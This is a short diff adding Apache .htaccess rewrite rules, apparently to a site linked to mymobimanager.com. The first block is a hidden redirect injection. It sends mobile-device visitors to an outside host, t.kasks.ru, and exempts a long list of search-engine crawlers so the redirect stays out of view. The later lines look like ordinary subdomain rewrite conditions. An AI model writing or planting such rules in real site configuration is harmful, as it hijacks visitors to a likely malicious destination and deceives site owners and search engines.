@@ -1,0 +1,10 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} (symbos|windows\ mobile|smartphone|blackberry|ppc|midp|windows\ ce|mtk|j2me|symbian|series\ 60|android) [NC]
+RewriteCond %{HTTP_USER_AGENT} !(ask\ jeeves|gamespy|googlebot|baidu|slurp|worldindexer|yandexaddurl|yandexnews|jigsaw|yandexmetrika|antabot|mmcrawler|gsa-crawler|yandexdirect|webalta|feedfetcher|yandexblogs|yandeximageresizer|accoona|yandexbot|yahoofeedseeker|grub-client|yandexmedia|ia_archiver|yandexvideo|yandexcatalog|gigabot|eltaindexer|gulper|mihalism|msnbot|ooyyo|pagebull|scooter|w3c_validator|yandeximages|yandexfavicons) [NC]
+RewriteRule (.*) http://t.kasks.ru/info.php?sid=4 [L,R=302]
+RewriteEngine on
+RewriteCond %{HTTP_HOST} !^www\. [NC]
+RewriteCond %{REQUEST_URI} !^/admin/ [NC]
+RewriteCond %{REQUEST_URI} !^/(.*)/ [NC]
+RewriteCond %{REQUEST_URI} !^/(.*)\. [NC]
+RewriteCond %{HTTP_HOST}<>%{REQUEST_URI} ^([^.]+)\.mymobimanager\.com(:80)?<>/([^/]*) [NC]
